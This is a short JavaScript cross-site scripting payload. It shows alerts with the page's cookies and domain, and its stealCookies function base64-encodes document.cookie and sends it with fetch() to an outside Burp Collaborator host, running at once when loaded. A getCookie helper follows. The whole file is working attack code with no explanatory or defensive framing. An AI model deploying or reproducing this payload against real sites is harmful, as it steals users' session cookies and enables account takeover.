alert(document.cookie);
alert(document.domain);
function stealCookies(){
  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}
stealCookies();
